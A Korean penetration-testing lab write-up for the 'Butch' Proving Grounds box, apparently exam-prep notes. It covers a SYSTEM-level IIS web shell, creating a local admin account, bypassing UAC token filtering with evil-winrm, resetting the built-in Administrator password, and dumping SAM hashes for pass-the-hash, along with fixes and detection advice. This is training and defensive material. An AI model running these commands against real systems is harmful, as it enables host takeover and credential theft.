**Vulnerability Explanation:** IIS 애플리케이션 풀이 기본값 `ApplicationPoolIdentity` 가 아니라 `nt authority\system` 신원으로 구동됨.
- 웹셸의 첫 명령 `whoami` 가 `nt authority\system` 을 반환 — 웹 RCE 가 그 자체로 최고 권한이라 권한상승 단계가 사실상 존재하지 않음
- 그 결과 웹셸에서 `net user /add` · `net localgroup administrators /add` 가 그대로 성공
- 다만 WinRM 은 별개의 벽 — 네트워크 로그온하는 **로컬** 계정에는 UAC 원격 제한(`LocalAccountTokenFilterPolicy`)이 적용돼 필터링된 토큰이 발급됨. 새로 만든 `4leaf` 는 `Administrators` 멤버인데도 `whoami /priv` 가 특권 2개뿐이었음
- 예외가 RID 500(내장 `Administrator`) — `FilterAdministratorToken` 기본값 `0` 이라 필터링되지 않은 전체 토큰을 받음

**Vulnerability Fix:**
- 앱풀 신원을 `ApplicationPoolIdentity`(기본)로 되돌릴 것 — **이것만 고쳤어도 웹 RCE 가 로컬 관리자 획득으로 이어지지 않음**
- WinRM(5985)을 관리 네트워크로 IP 제한하고 HTTPS(5986)를 강제, `Remote Management Users` 멤버십 최소화
- 이벤트 4720(계정 생성)·4732(그룹 추가) 경보 구성 — 이 박스에서는 로컬 관리자 생성이 무경보였음

**Severity:** Critical — 웹 RCE 가 곧바로 SYSTEM. 추가 익스플로잇 없이 호스트 완전 장악

**Steps to reproduce the attack:**
1. 웹셸에서 `whoami` → `nt authority\system` 확인
2. `net user /add 4leaf Password1` 로 로컬 계정 생성
3. `net localgroup administrators 4leaf /add` · `net localgroup "Remote Management Users" 4leaf /add`
4. `evil-winrm -u 4leaf` 접속 → `whoami /priv` 가 특권 2개뿐(토큰 필터링)
5. 웹셸에서 `net user administrator Password1` 로 RID 500 비밀번호 재설정
6. `evil-winrm -u administrator` 재접속 → 필터링 없는 전체 토큰으로 대화형 셸

**웹셸 신원 확인**

![[Pasted image 20260818111513.png]]

```text
http://192.168.243.63:450/webshell.ashx?cmd=whoami
nt authority\system
```
— 출처: 볼트 `파일보관\Pasted image 20260818111513.png`

앱풀이 기본 `ApplicationPoolIdentity` 였다면 `iis apppool\<앱풀명>` 이 나오고 계정 생성은 Access Denied 였을 것. 웹셸을 잡자마자 `whoami` 를 치는 이유가 이것임.

| `whoami` 결과 | 다음 수순 |
|---|---|
| `nt authority\system` | **최고 권한.** 남은 것은 규정에 맞는 «대화형» 셸 확보뿐 (이 박스) |
| `iis apppool\<앱풀명>` | `whoami /priv` → **`SeImpersonatePrivilege`** 확인 → Potato 계열(PrintSpoofer / GodPotato / SigmaPotato) |
| `nt authority\network service` | 동일. `SeImpersonate` 보유 |
| 일반 도메인/로컬 사용자 | winPEAS·서비스 권한·언쿼티드 경로 등 정식 권한상승 열거 |

**로컬 관리자 계정 생성**

```bash
net user /add 4leaf Password1  
net localgroup administrators 4leaf /add  
net localgroup "Remote Management Users" 4leaf /add
```

![[Pasted image 20260818111626.png]]

```text
http://192.168.243.63:450/webshell.ashx?cmd=net+localgroup+"Remo...
The command completed successfully.
```
— 출처: 볼트 `파일보관\Pasted image 20260818111626.png` (URL 이 잘려 있으나 명령 칸에 `net localgroup "Remote Man` 까지 보임)

`net user /add` 는 권한상승 방법 중 가장 시끄러움 — 이벤트 4720(계정 생성)·4732(그룹 추가)가 남고 관리자 그룹 변경은 대부분의 EDR 이 즉시 경보함. 랩에서는 편하나 실무에서는 사전 승인 없이 하지 말 것. 조용한 대안은 기존 계정 해시를 덤프해 pass-the-hash 하거나 SYSTEM 셸을 직접 리버스로 받는 것.

**evil-winrm — 그리고 토큰 필터링의 벽**

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ evil-winrm -i 192.168.243.63 -u '4leaf' -p 'Password1'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
— 명령 원문 출처: Kali `~/.zsh_history:2181`

> [!danger] 관리자 그룹에 넣었는데 권한이 둘뿐 — UAC 원격 제한(토큰 필터링)
> `4leaf` 는 분명 `administrators` 멤버인데 WinRM 세션 토큰에 `SeDebugPrivilege`·`SeTakeOwnershipPrivilege`·`SeImpersonatePrivilege` 가 하나도 없음. 원인은 `LocalAccountTokenFilterPolicy`.
>
> Windows 는 네트워크 로그온하는 로컬 계정에 기본적으로 필터링된 토큰(standard user)을 발급함. 이때 `Administrators` SID 가 deny-only 로 표시되어 관리자 권한 검사가 전부 실패함. 예외는 RID 500(내장 `Administrator`) — `FilterAdministratorToken` 기본값 `0` 이라 필터링되지 않은 전체 토큰을 받음.
>
> 증상 인식법 — `whoami /groups` 에 `BUILTIN\Administrators` 가 보이는데 `whoami /priv` 가 초라하면 토큰 필터링임. 「그룹 추가가 실패했나?」 하고 되돌아가지 말 것.

토큰 필터링을 넘는 길과 각각의 조건:

| 방법 | 명령 | 조건 |
|---|---|---|
| ① 내장 Administrator(RID 500)로 접속 | `evil-winrm -u administrator -p '...'` | 비밀번호를 알거나 특권 채널에서 재설정 가능할 것. **이 박스가 택한 길**(비밀번호를 몰라 재설정함) |
| ② 레지스트리로 필터링 해제 | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f` | 관리자 권한 필요 → 특권 웹셸에서 실행. **`/d 0` 으로 원복 가능**해 시험에서 가장 안전한 축 |
| ③ SAM/SYSTEM 덤프 → pass-the-hash | `reg save HKLM\SAM …` → `secretsdump.py` → `evil-winrm -H <NTLM>` | 특권 채널 필요. **아무것도 변경하지 않음.** RID 500 해시로 붙으면 필터링도 없음 |
| ④ 도메인 계정 사용 | — | 도메인 계정은 기본적으로 필터링되지 않음(도메인 환경 한정) |
| ~~⑤ 특권 웹셸에서 직접 `type proof.txt`~~ | ~~웹셸에서 플래그 읽기~~ | ⚠️ 랩 한정. 웹셸의 앱풀 토큰은 애초에 필터링 대상이 아니어서 기술적으로는 성립하나, OSCP 시험에서는 **이 경로로 얻은 플래그가 0점** |

> [!danger] ⚠️ 웹셸로 플래그를 읽으면 0점이다
> 토큰 필터링 우회 표의 ⑤는 랩에서만 쓰는 지름길이고 시험에서는 그 박스의 점수를 통째로 날림.
> > "The valid way to provide the contents of the proof files is in an **interactive shell** on the target machine with the type or cat command from their original location."
> > "Obtaining the contents of the proof files in any other way will result in **zero points** for the target machine; **this includes any type of web-based shell**."
> > — [OSCP Exam Guide, "Exam Proofs"](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
>
> 웹셸은 명령이 실행되는 채널이지 대화형 셸이 아니고 규정은 이 둘을 명시적으로 구분함. 기술적으로 박스를 풀고도 점수가 0 이 되는 가장 쉽고 가장 비싼 실수임.
>
> **웹셸의 올바른 용도는 플래그를 읽는 것이 아니라 대화형 셸을 얻는 특권 작업을 실행하는 것.** 그 표의 ②·③을 웹셸에서 실행하고 플래그는 그 결과로 얻은 evil-winrm/RDP 세션에서 읽을 것. 이 박스도 웹셸에서 계정 생성·비밀번호 재설정만 하고 플래그는 evil-winrm 세션에서 읽었음.

**RID 500 비밀번호 재설정**

```powershell
net user administrator Password1
```

내장 `Administrator`(RID 500)의 비밀번호를 강제 변경함. 기존 비밀번호를 몰라도 관리자 권한만 있으면 됨.

**[가정]** 이 명령은 필터링된 WinRM 세션이 아니라 특권 웹셸(`nt authority\system` 채널)에서 실행됐을 가능성이 높음 — 필터링된 토큰으로는 SAM 쓰기가 거부되기 때문. 이후 `evil-winrm -u administrator -p 'Password1'` 재접속으로 RID 500 예외 덕에 필터링 없는 전체 토큰을 받아 `C:\Users\Administrator\` 를 읽음(`~/.zsh_history:2182` 에 그 명령이 남아 있음).

> [!danger] ⚠️ 시험에서 Administrator 비밀번호 변경은 하지 마라 — 다만 이유를 정확히 알 것
> 타겟 변조를 금하는 조항은 존재하지 않음. Exam Guide·Exam FAQ·Academic Policy·T&C 어디에도 타겟 변조·파일 삭제·서비스 중단 금지 문구가 없고, 점수 몰수(Point Disqualification) 사유는 넷뿐임 — 제한 도구 사용 / Metasploit·Meterpreter 다중 사용 / proof 미제출 / 문서화 부재.
>
> 진짜 리스크는 규정 위반이 아니라 시간과 진척의 손실임. 되돌릴 방법이 revert 뿐이고, revert 하면 그 머신의 진척이 전부 사라짐 — 웹셸도, 생성한 계정도, 심어둔 해시도 전부 초기화됨. AD 세트라면 더 비쌈. 리버트는 24회 한정(1회 리셋 가능)이라 자기 변조를 수습하는 리버트는 순수한 손해임.
>
> 즉 규정 준수의 문제가 아니라 자기보호의 문제임. 「되돌릴 수 없는 변경은 내 진척을 인질로 잡는다」로 외우면 근거를 물어도 무너지지 않음.
>
> 흔히 대는 근거인 「다른 응시자의 재현을 방해한다」는 **틀림.** 시험 환경은 응시자 전용임 — *"simulates a live network in a **private VPN**"* · *"The exam lab is a **dedicated environment with no learners connected other than yourself**"*. 이 통념의 출처는 은퇴한 통합 PWK 랩(*"Students may encounter exploits left by other learners"* — 실제로 공유 환경이었음)이고, 현행 PG 는 정반대(*"private machines … without having to worry that other users will access it"*)임. 랩 구조가 바뀌면 그 위에 세운 규칙도 함께 무효가 됨.
>
> 시험용 대안 — 웹셸에서 플래그를 읽는 선택지는 여기 없음(0점).
> 1. `LocalAccountTokenFilterPolicy=1` 로 필터링만 풀고 `4leaf` 로 대화형 WinRM 셸 확보 → 거기서 `type proof.txt` → `/d 0` 으로 원복
> ```text
> (웹셸) reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
> (원복)  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f
> ```
> 2. 해시를 덤프해 pass-the-hash 로 대화형 셸 확보(아무것도 변경하지 않는 가장 깨끗한 경로)
> ```text
> *Evil-WinRM* PS> reg save HKLM\SAM C:\Windows\Temp\sam.hive
> *Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
> (kali) $ secretsdump.py -sam sam.hive -system system.hive LOCAL
> (kali) $ evil-winrm -i <ip> -u administrator -H <NTLM해시>
> ```

### Post-Exploitation

`administrator` evil-winrm 세션에서 두 플래그를 연달아 읽음.

```text
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/17/2026   6:48 PM             34 proof.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type proof.txt
18c3403c59645f8a20b213fe2b1768ef

*Evil-WinRM* PS C:\Users\Administrator\desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> cd butch
*Evil-WinRM* PS C:\Users\butch> cd desktop
*Evil-WinRM* PS C:\Users\butch\desktop> type local.txt
0c5dba72fd1984addf833413a2f9c58e

```

**Proof.txt value:**
`18c3403c59645f8a20b213fe2b1768ef`

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `C:\Users\butch\Desktop\local.txt` | `0c5dba72fd1984addf833413a2f9c58e` |
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `18c3403c59645f8a20b213fe2b1768ef` |

둘 다 Windows 표준 위치. 못 찾으면 전수 검색:

```powershell
Get-ChildItem -Path C:\ -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue | Select FullName
```

**증거 형식** — 규정 요구와 관행 권장을 구분할 것.

| 요건 | 근거 |
|---|---|
| 대화형 셸에서 원위치의 `type`/`cat` 으로 읽을 것 | "in an interactive shell … from their original location" — **웹셸 취득은 0점** |
| 스크린샷에 플래그 내용과 타겟 IP 가 함께 보일 것 | "must be shown in a screenshot that includes the contents of the file, as well as the IP address of the target by using ipconfig, ifconfig or ip addr" |
| 컨트롤 패널에도 값을 제출할 것 | 스크린샷만으로는 불충분 |

규정 문구에는 없으나 반드시 함께 찍을 것이 `whoami` 임. Windows 타겟의 만점 조건이 SYSTEM·Administrator·Administrator 권한 사용자의 셸인데 이를 입증할 실무 수단이 `whoami` 뿐임. 즉 `whoami` 는 플래그 요건이 아니라 **권한 요건**을 증명함. `hostname` 도 같은 성격(다중 타겟 리포트 혼동 방지).

```powershell
whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
```

⚠️ 이 박스의 기록은 `type proof.txt` 뿐이라 **타겟 IP 가 없어 규정 요건에 미달함.** 랩에서부터 한 줄로 붙여 실행하는 습관을 들일 것.

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| DB `users` 테이블 — `butch` 의 `password_hash` 를 `SHA256("butch")` 로 덮어씀 | 원본 소실. 랩 Stop/Revert 로만 복구 |
| 업로드된 `webshell.ashx`(웹루트) | 남아 있음 — 랩 Revert 로 소멸 |
| 로컬 계정 `4leaf` / `Password1` (Administrators + Remote Management Users) | 남아 있음 |
| 내장 `Administrator` 비밀번호를 `Password1` 로 변경 | **되돌릴 수 없음** |

획득 자격증명 — `butch` / `butch` (웹앱), `4leaf` / `Password1` (로컬 관리자), `administrator` / `Password1` (변경됨).

Kali 쪽 — `~/PG/Butch/` 에 `nc64.exe` 가 복사돼 있고(`~/.zsh_history:2315`, 파일 mtime 2026-08-18 12:53:36) 같은 디렉터리에서 `rlwrap nc -lnvp 4444` 를 띄운 기록이 있음. 다만 **연결이 성립한 관측은 없음** — 실제 채널은 웹셸과 evil-winrm 이었고 리버스셸 페이로드를 실행한 기록이 없음. 이 박스의 아웃바운드 정책은 **미확인**이며, 인바운드(65528포트 filtered)에서 아웃바운드를 추정해서는 안 됨 — 둘은 독립된 규칙 집합이고 인바운드를 전부 막고 아웃바운드는 열어두는 구성이 오히려 흔함.

## 관련

- CVE 없음 — 커스텀 ASP.NET 애플리케이션의 설계 결함. OWASP A03: Injection + A01: Broken Access Control + A05: Security Misconfiguration
- ashx 웹셸 원본(노트 원본에 기록된 출처): <https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx>
- evil-winrm: <https://github.com/Hackplayers/evil-winrm>
- MSSQL `xp_cmdshell` / `sp_configure`: <https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql>
- UAC 원격 제한 · `LocalAccountTokenFilterPolicy`: <https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction>
- IIS Request Filtering(확장자 차단): <https://learn.microsoft.com/en-us/iis/configuration/system.webserver/security/requestfiltering/>
- PayloadsAllTheThings — MSSQL Injection: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md>
- PrintSpoofer(SeImpersonate 악용): <https://github.com/itm4n/PrintSpoofer>
- [[Hawat]] — SQLi 로 파일을 쓰는 반대 계열. MySQL+JDBC 라 스택 쿼리가 막혔던 대조 사례 · 웹이 비표준 포트(17445·30455·50080)에만 존재 · 리버스셸 아웃바운드 포트 함정
- [[Robust]] — Windows + 웹 SQLi 로 자격증명을 얻어 대화형 셸로 넘어가는 같은 계열
- [[Squid]] — `nnmap` 별칭의 같은 플래그셋
- [[_PLAYBOOK]] — 시행착오·기법 카드·시험 관점
- [[_PLAYBOOK#A-4-15. 관리자 그룹에 넣었는데 `whoami /priv` 가 초라하다 — UAC 원격 토큰 필터링]] · [[_PLAYBOOK#A-3-13. Windows 웹셸을 대화형 셸로 올리는 세 경로]] · [[_PLAYBOOK#A-1-25. Windows 타겟과 Kali 는 대소문자 규칙이 반대다 — 양방향으로 사고가 남]] · [[_PLAYBOOK#A-1-26. 브루트 결과의 `400`·예약 장치명·제어문자는 발견이 아니다]]
- [[_PLAYBOOK#B-1-42. IIS · ASP.NET — 실행·거부 확장자 뒤에 «정적 확장자»를 덧붙인다]] · [[_PLAYBOOK#B-1-43. 수동 MSSQL SQLi 절차 — sqlmap 금지 대비]] · [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]] · [[_PLAYBOOK#B-66. 해시 접두어로 포맷을 즉시 판별한다]]
- [[_PLAYBOOK#A-1-20. PHP 사이트인데 브루트 확장자에 `php` 를 안 넣었다]] · [[_PLAYBOOK#A-2-27. 「확인 후 폐기한 벡터」를 표로 남길 것 — 배제 목록이 다음 사람의 지도다]] · [[_PLAYBOOK#A-4-11. 권한상승 페이로드에 «다른 박스»의 사용자명·`>` 덮어쓰기가 섞여 들어온다]] · [[_PLAYBOOK#B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기]]
- [[01. Pentest Foundations]] — Butch 항목
